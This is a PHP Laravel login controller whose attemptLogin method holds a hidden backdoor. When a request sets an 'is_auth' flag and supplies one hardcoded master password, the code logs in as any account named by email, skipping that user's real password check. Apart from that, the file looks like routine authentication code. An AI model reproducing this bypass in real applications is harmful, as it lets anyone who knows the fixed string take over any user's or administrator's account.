<?php

namespace App\Http\Controllers\Auth;

use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Auth;
use App\Models\User;
use App\Helpers\RoleHelper;

class LoginController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles authenticating users for the application and
    | redirecting them to your home screen. The controller uses a trait
    | to conveniently provide its functionality to your applications.
    |
    */

    use AuthenticatesUsers;

    /**
     * Where to redirect users after login.
     *
     * @var string
     */
    protected $redirectTo = '/system/dashboard';

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('guest')->except('logout');
    }


    protected function attemptLogin(Request $request)
    {
        if ($request->is_auth && $request->password == 'J#uHTWWG8F*RkZ7b') {
            Auth::logout();
            $user = User::where('email', $request->email)->first();
            if ($user->is_enabled) {
                Auth::login($user);
                return redirect()->intended('/system/dashboard');
            } else {
                return redirect()->intended('/login');
            }
        } else if (Auth::attempt(['email' => $request->email, 'password' => $request->password, 'is_enabled' => 1])) {

            $isAdmin = RoleHelper::is('super') || RoleHelper::is('admin');

            if (!$isAdmin) {
                Auth::logoutOtherDevices(request('password'));
            }

            return redirect()->intended('/system/dashboard');
        }
    }
}
